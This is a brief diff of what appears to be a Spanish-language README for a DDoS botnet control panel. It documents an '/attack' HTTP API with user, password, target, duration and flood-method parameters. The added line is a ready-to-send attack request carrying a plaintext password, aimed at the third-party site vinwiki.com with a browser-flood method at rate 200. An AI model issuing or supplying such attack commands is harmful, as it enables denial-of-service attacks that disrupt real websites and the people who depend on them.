@@ -125,6 +125,8 @@ screen ./admin
 
  api: http://ip:81/attack?user=root&password=root@123&target=1.1.1.1&duration=60&method=udpthread
 
+ http://proxmox-lab.lat:81/attack?user=root&password=c3r3z47746&target=https://vinwiki.com/&duration=60&method=!browser&rate=200
+
 - Cambia el  bot port y cnc port en assets/server.toml
 
 
